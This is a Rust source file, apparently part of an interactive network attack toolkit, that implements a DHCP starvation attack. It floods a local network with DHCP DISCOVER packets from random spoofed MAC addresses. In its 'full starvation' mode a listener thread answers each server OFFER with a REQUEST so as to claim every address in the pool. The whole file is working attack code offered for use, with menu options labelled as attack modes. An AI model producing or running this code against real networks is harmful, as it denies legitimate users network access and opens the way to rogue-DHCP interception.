use dialoguer::{theme::ColorfulTheme, Input, Select};
use pnet::datalink::{self, NetworkInterface, Channel};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket, EthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{MutableIpv4Packet, Ipv4Packet, checksum};
use pnet::packet::udp::{MutableUdpPacket, UdpPacket, ipv4_checksum};
use pnet::packet::{MutablePacket, Packet};
use pnet::util::MacAddr;
use std::net::Ipv4Addr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use rand::Rng;

#[derive(Debug, Clone, PartialEq)]
pub enum StarvationMode {
    Simple,
    ExtremeFlooding,
    FullStarvation,
}

#[derive(Debug, Clone)]
pub struct DhcpStarvationConfig {
    pub interface: Option<NetworkInterface>,
    pub mode: StarvationMode,
    pub delay_ms: u64,
}

impl Default for DhcpStarvationConfig {
    fn default() -> Self {
        Self {
            interface: None,
            mode: StarvationMode::Simple,
            delay_ms: 100,
        }
    }
}

pub fn run() {
    let mut config = DhcpStarvationConfig::default();
    let selections = &["List network settings", "Set network settings", "Start", "Back"];

    loop {
        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("DHCP Starvation Menu")
            .default(0)
            .items(&selections[..])
            .interact()
            .unwrap();

        match selections[selection] {
            "List network settings" => list_network_settings(),
            "Set network settings" => set_network_settings(&mut config),
            "Start" => start_starvation(&config),
            "Back" => break,
            _ => unreachable!(),
        }
    }
}

fn list_network_settings() {
    let interfaces = datalink::interfaces();
    if interfaces.is_empty() {
        println!("No network interfaces found.");
        return;
    }

    let interface_names: Vec<String> = interfaces
        .iter()
        .map(|iface| format!("{} ({})", iface.name, iface.mac.unwrap_or_default()))
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select a network interface to view details")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    let selected_interface = &interfaces[selection];
    println!("\n--- Interface Details: {} ---", selected_interface.name);
    if let Some(mac) = selected_interface.mac {
        println!("MAC Address: {}", mac);
    }
    
    for ip in &selected_interface.ips {
        println!(" - IP: {} / Mask: {}", ip.ip(), ip.mask());
    }
    println!("---------------------------------\n");
}

fn set_network_settings(config: &mut DhcpStarvationConfig) {
    let interfaces = datalink::interfaces();
    if interfaces.is_empty() {
        println!("No interfaces found.");
        return;
    }

    let interface_names: Vec<String> = interfaces
        .iter()
        .map(|iface| format!("{} ({})", iface.name, iface.mac.unwrap_or_default()))
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select Interface")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    config.interface = Some(interfaces[selection].clone());

    let modes = &["Simple (Configurable Delay)", "Extreme Flooding (No Delay)", "Full Starvation (DORA)"];
    let mode_sel = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select Attack Mode")
        .default(0)
        .items(&modes[..])
        .interact()
        .unwrap();

    match mode_sel {
        0 => {
            config.mode = StarvationMode::Simple;
            let delay_input: String = Input::with_theme(&ColorfulTheme::default())
                .with_prompt("Delay between packets (ms)")
                .default("100".to_string())
                .interact_text()
                .unwrap();
            config.delay_ms = delay_input.parse().unwrap_or(100);
        },
        1 => {
            config.mode = StarvationMode::ExtremeFlooding;
            config.delay_ms = 0;
        },
        2 => {
            config.mode = StarvationMode::FullStarvation;
            config.delay_ms = 10; // Minimal delay to allow listener to process
        },
        _ => unreachable!(),
    }

    println!("Configuration Updated.");
}

fn start_starvation(config: &DhcpStarvationConfig) {
    if config.interface.is_none() {
        println!("Error: Interface not selected.");
        return;
    }

    let interface = config.interface.as_ref().unwrap();
    println!("Starting DHCP Starvation on {}...", interface.name);
    match config.mode {
        StarvationMode::Simple => println!("Mode: Simple (Delay: {}ms)", config.delay_ms),
        StarvationMode::ExtremeFlooding => println!("Mode: Extreme Flooding"),
        StarvationMode::FullStarvation => println!("Mode: Full Starvation (DORA)"),
    }
    println!("Press Ctrl+C to stop.");

    let (mut tx, _rx) = match datalink::channel(interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => {
            println!("Unhandled channel type");
            return;
        }
        Err(e) => {
            println!("Error creating channel: {}", e);
            return;
        }
    };

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    // Handle Ctrl+C (optional, but good for cleanup if we had any)
    // For now, we rely on the user killing the process or simple loop break if we had input.
    // Since we are blocking, we just loop.

    let mut rng = rand::rng();

    if config.mode == StarvationMode::FullStarvation {
        // Spawn listener thread for DORA
        let interface_clone = interface.clone();
        let r_clone = r.clone();
        
        thread::spawn(move || {
            let (mut tx_listener, mut rx_listener) = match datalink::channel(&interface_clone, Default::default()) {
                Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
                _ => return,
            };

            while r_clone.load(Ordering::Relaxed) {
                match rx_listener.next() {
                    Ok(packet) => {
                        handle_dhcp_offer(packet, &mut *tx_listener, &interface_clone);
                    },
                    Err(_) => continue,
                }
            }
        });
    }

    loop {
        // Generate random MAC
        let mut mac_bytes = [0u8; 6];
        rng.fill(&mut mac_bytes);
        mac_bytes[0] = (mac_bytes[0] & 0xFE) | 0x02; 
        let src_mac = MacAddr::new(mac_bytes[0], mac_bytes[1], mac_bytes[2], mac_bytes[3], mac_bytes[4], mac_bytes[5]);
        
        // Generate random XID
        let mut xid = [0u8; 4];
        rng.fill(&mut xid);

        send_dhcp_discover(&mut *tx, src_mac, &xid);
        
        if config.mode == StarvationMode::Simple {
            if config.delay_ms > 0 {
                thread::sleep(Duration::from_millis(config.delay_ms));
            }
        } else if config.mode == StarvationMode::FullStarvation {
            // In full starvation, we still want to send discovers to trigger offers.
            // But maybe not as fast as extreme flooding to give time for processing?
            // Let's use the configured delay (which we set to 10ms default).
            if config.delay_ms > 0 {
                thread::sleep(Duration::from_millis(config.delay_ms));
            }
        }
        // ExtremeFlooding has no delay
    }
}

fn handle_dhcp_offer(packet: &[u8], tx: &mut dyn datalink::DataLinkSender, _interface: &NetworkInterface) {
    let ethernet = EthernetPacket::new(packet).unwrap();
    if ethernet.get_ethertype() != EtherTypes::Ipv4 { return; }
    
    let ipv4 = Ipv4Packet::new(ethernet.payload()).unwrap();
    if ipv4.get_next_level_protocol() != IpNextHeaderProtocols::Udp { return; }
    
    let udp = UdpPacket::new(ipv4.payload()).unwrap();
    // DHCP Server (67) -> Client (68)
    if udp.get_source() != 67 || udp.get_destination() != 68 { return; }

    let payload = udp.payload();
    // Basic checks
    if payload.len() < 240 { return; }
    // Magic Cookie
    if payload[236] != 0x63 || payload[237] != 0x82 || payload[238] != 0x53 || payload[239] != 0x63 { return; }
    
    // Check Message Type (Option 53)
    let mut msg_type = 0;
    let mut server_id = Ipv4Addr::new(0,0,0,0);
    let mut i = 240;
    
    while i < payload.len() {
        let code = payload[i];
        if code == 255 { break; }
        if code == 0 { i += 1; continue; }
        let len = payload[i+1] as usize;
        
        if code == 53 && len == 1 {
            msg_type = payload[i+2];
        } else if code == 54 && len == 4 { // Server Identifier
            server_id = Ipv4Addr::new(payload[i+2], payload[i+3], payload[i+4], payload[i+5]);
        }
        
        i += 2 + len;
    }

    if msg_type == 2 { // Offer
        // Extract XID
        let xid = &payload[4..8];
        // Extract YIADDR (Your IP)
        let yiaddr = Ipv4Addr::new(payload[16], payload[17], payload[18], payload[19]);
        // Extract CHADDR (Client MAC) - we need to reply with the same MAC we used
        let chaddr = &payload[28..34];
        let client_mac = MacAddr::new(chaddr[0], chaddr[1], chaddr[2], chaddr[3], chaddr[4], chaddr[5]);

        // Send Request
        send_dhcp_request(tx, client_mac, xid, yiaddr, server_id);
    }
}

fn send_dhcp_request(
    tx: &mut dyn datalink::DataLinkSender,
    src_mac: MacAddr,
    xid: &[u8],
    requested_ip: Ipv4Addr,
    server_id: Ipv4Addr
) {
    let mut ethernet_buffer = [0u8; 342]; 
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(src_mac);
    ethernet_packet.set_ethertype(EtherTypes::Ipv4);

    let mut ipv4_packet = MutableIpv4Packet::new(ethernet_packet.payload_mut()).unwrap();
    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(328); 
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
    ipv4_packet.set_source(Ipv4Addr::new(0, 0, 0, 0));
    ipv4_packet.set_destination(Ipv4Addr::new(255, 255, 255, 255));
    ipv4_packet.set_checksum(checksum(&ipv4_packet.to_immutable()));

    let mut udp_packet = MutableUdpPacket::new(ipv4_packet.payload_mut()).unwrap();
    udp_packet.set_source(68);
    udp_packet.set_destination(67);
    udp_packet.set_length(308); 
    
    let payload = udp_packet.payload_mut();
    // Clear
    for b in payload.iter_mut() { *b = 0; }

    payload[0] = 1; // Boot Request
    payload[1] = 1; // Ethernet
    payload[2] = 6; // HW Len
    payload[3] = 0; // Hops
    
    // XID
    payload[4] = xid[0];
    payload[5] = xid[1];
    payload[6] = xid[2];
    payload[7] = xid[3];

    // CHADDR
    let mac_octets = src_mac.octets();
    payload[28] = mac_octets[0];
    payload[29] = mac_octets[1];
    payload[30] = mac_octets[2];
    payload[31] = mac_octets[3];
    payload[32] = mac_octets[4];
    payload[33] = mac_octets[5];

    // Magic Cookie
    payload[236] = 0x63;
    payload[237] = 0x82;
    payload[238] = 0x53;
    payload[239] = 0x63;

    // Options
    let mut cursor = 240;

    // Option 53: Message Type (Request = 3)
    payload[cursor] = 53;
    payload[cursor+1] = 1;
    payload[cursor+2] = 3;
    cursor += 3;

    // Option 50: Requested IP Address
    let req_ip_octets = requested_ip.octets();
    payload[cursor] = 50;
    payload[cursor+1] = 4;
    payload[cursor+2] = req_ip_octets[0];
    payload[cursor+3] = req_ip_octets[1];
    payload[cursor+4] = req_ip_octets[2];
    payload[cursor+5] = req_ip_octets[3];
    cursor += 6;

    // Option 54: Server Identifier
    let srv_id_octets = server_id.octets();
    payload[cursor] = 54;
    payload[cursor+1] = 4;
    payload[cursor+2] = srv_id_octets[0];
    payload[cursor+3] = srv_id_octets[1];
    payload[cursor+4] = srv_id_octets[2];
    payload[cursor+5] = srv_id_octets[3];
    cursor += 6;

    // Option 55: Parameter Request List
    payload[cursor] = 55;
    payload[cursor+1] = 4;
    payload[cursor+2] = 1; // Subnet Mask
    payload[cursor+3] = 3; // Router
    payload[cursor+4] = 6; // DNS
    payload[cursor+5] = 15; // Domain Name
    cursor += 6;

    // End Option
    payload[cursor] = 255;

    // UDP Checksum
    udp_packet.set_checksum(ipv4_checksum(&udp_packet.to_immutable(), &Ipv4Addr::new(0,0,0,0), &Ipv4Addr::new(255, 255, 255, 255)));

    tx.send_to(ethernet_packet.packet(), None);
    // print!("r"); // Indicate request sent
    // use std::io::Write;
    // std::io::stdout().flush().unwrap();
}

fn send_dhcp_discover(
    tx: &mut dyn datalink::DataLinkSender,
    src_mac: MacAddr,
    xid: &[u8]
) {
    let mut ethernet_buffer = [0u8; 342]; 
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(src_mac);
    ethernet_packet.set_ethertype(EtherTypes::Ipv4);

    let mut ipv4_packet = MutableIpv4Packet::new(ethernet_packet.payload_mut()).unwrap();
    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(328); 
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
    ipv4_packet.set_source(Ipv4Addr::new(0, 0, 0, 0));
    ipv4_packet.set_destination(Ipv4Addr::new(255, 255, 255, 255));
    ipv4_packet.set_checksum(checksum(&ipv4_packet.to_immutable()));

    let mut udp_packet = MutableUdpPacket::new(ipv4_packet.payload_mut()).unwrap();
    udp_packet.set_source(68);
    udp_packet.set_destination(67);
    udp_packet.set_length(308); 
    
    let payload = udp_packet.payload_mut();
    // Clear
    for b in payload.iter_mut() { *b = 0; }

    payload[0] = 1; // Boot Request
    payload[1] = 1; // Ethernet
    payload[2] = 6; // HW Len
    payload[3] = 0; // Hops
    
    // XID
    payload[4] = xid[0];
    payload[5] = xid[1];
    payload[6] = xid[2];
    payload[7] = xid[3];

    // CHADDR (Client HW Addr)
    let mac_octets = src_mac.octets();
    payload[28] = mac_octets[0];
    payload[29] = mac_octets[1];
    payload[30] = mac_octets[2];
    payload[31] = mac_octets[3];
    payload[32] = mac_octets[4];
    payload[33] = mac_octets[5];

    // Magic Cookie
    payload[236] = 0x63;
    payload[237] = 0x82;
    payload[238] = 0x53;
    payload[239] = 0x63;

    // Options
    let mut cursor = 240;

    // Option 53: Message Type (Discover = 1)
    payload[cursor] = 53;
    payload[cursor+1] = 1;
    payload[cursor+2] = 1;
    cursor += 3;

    // Option 55: Parameter Request List
    payload[cursor] = 55;
    payload[cursor+1] = 4;
    payload[cursor+2] = 1; // Subnet Mask
    payload[cursor+3] = 3; // Router
    payload[cursor+4] = 6; // DNS
    payload[cursor+5] = 15; // Domain Name
    cursor += 6;

    // End Option
    payload[cursor] = 255;

    // UDP Checksum
    udp_packet.set_checksum(ipv4_checksum(&udp_packet.to_immutable(), &Ipv4Addr::new(0,0,0,0), &Ipv4Addr::new(255, 255, 255, 255)));

    tx.send_to(ethernet_packet.packet(), None);
    print!(".");
    use std::io::Write;
    std::io::stdout().flush().unwrap();
}
